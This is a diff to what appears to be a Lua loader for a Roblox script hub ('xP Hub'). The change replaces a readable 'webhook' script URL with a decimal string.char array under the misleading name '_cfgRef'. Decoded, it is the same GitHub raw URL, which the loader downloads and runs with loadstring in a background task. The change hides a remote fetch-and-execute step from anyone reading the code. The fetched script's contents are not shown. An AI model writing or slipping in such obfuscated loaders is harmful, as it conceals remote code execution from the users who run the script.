@@ -17,7 +17,13 @@ local GameScripts = {
     [84448037861644]  = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/xP-Urban-Reload",
 }
 
-local WEBHOOK_SCRIPT_URL = "https://raw.githubusercontent.com/xP-Devv/xP-Hub/refs/heads/main/xPHub-info"
+local _cfgRef = string.char(
+    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,
+    117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,
+    109,47,120,80,45,68,101,118,118,47,120,80,45,72,117,98,47,
+    114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
+    120,80,72,117,98,45,105,110,102,111
+)
 
 local function WaitForGameLoaded(timeout)
     timeout = timeout or 30
@@ -110,7 +116,7 @@ print(string.format("[xP Hub] Detectando jogo... PlaceId: %s | GameId: %s | Univ
 pcall(function() getgenv().xP_DetectedScriptUrl = SelectedScriptUrl end)
 
 task.spawn(function()
-    local webhookCode = HttpGetWithRetry(WEBHOOK_SCRIPT_URL, 3)
+    local webhookCode = HttpGetWithRetry(_cfgRef, 3)
     if webhookCode then
         local ok, err = pcall(function() loadstring(webhookCode)() end)
         if not ok then warn("[xP Hub] Erro ao executar webhook: " .. tostring(err)) end
